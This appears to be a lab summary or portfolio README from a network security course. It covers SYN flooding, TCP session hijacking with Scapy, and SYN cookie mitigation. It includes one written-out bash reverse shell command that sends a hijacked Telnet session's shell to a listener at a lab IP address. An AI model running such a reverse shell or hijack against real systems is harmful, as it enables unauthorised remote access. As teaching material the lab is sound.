# TCP/IP Protocol Suite Exploitation Lab

## 📊 Executive Overview
This lab isolates and analyzes core design flaws inherent to transport-layer protocols (RFC 793). By removing modern transport security assumptions, attacks were built programmatically to hijack operational data lines, desynchronize live connections, and weaponize protocol state machines to instantiate unauthenticated terminal access.

---

## 🔑 Core Technical Domains

### 1. SYN Flooding Attack
* **Vulnerability Profile:** Weaponized the resource-allocation asymmetry of the TCP 3-way handshake. By flooding target nodes with spoofed `SYN` requests, the server's Half-Open Connection Table (`TCB` state memory allocation) was purposefully saturated.
* **Analysis Execution:** Monitored socket buffer depletion in real-time. Evaluated operational performance impacts on genuine remote entities trying to establish connections.
* **Remediation:** Assessed the operational mechanics of Linux `SYN Cookies`, examining how keeping server-side state encrypted inside the Initial Sequence Number (ISN) mitigates resource starvation.

### 2. TCP Session Hijacking
* **Exploitation Engine:** Engineered custom multi-layered packet injection utilities via Python/Scapy to hijack active unencrypted Telnet transport channels.
* **Sequence Matching:** Captured live packet streams to extract current `Sequence Number` ($SEQ$) and `Acknowledgment Number` ($ACK$) parameters. Constructed a race-condition payload matching target expectations to force command execution.
* **Desynchronization:** Handled the subsequent "ACK Storm" phenomenon caused by state mismatching between original client and server entities.

### 3. Reverse Shell Integration
* **Execution Vector:** Crafted and injected non-interactive shell command lines via the hijacked TCP state:
    ```bash
    /bin/bash -i > /dev/tcp/10.9.0.1/9090 0>&1 2>&1
    ```
    This hijacked the standard input/output/error descriptor streams of the target OS, redirecting them back to a listening raw network socket to achieve persistent Interactive Shell access.

---

## 🛠️ Toolchain Deployment
* **Languages:** Python 3, Assembly (Payload alignment concepts).
* **Libraries:** Scapy (Packet forging framework).
* **Diagnostics:** Wireshark, Netcat (`nc`), Telnet.
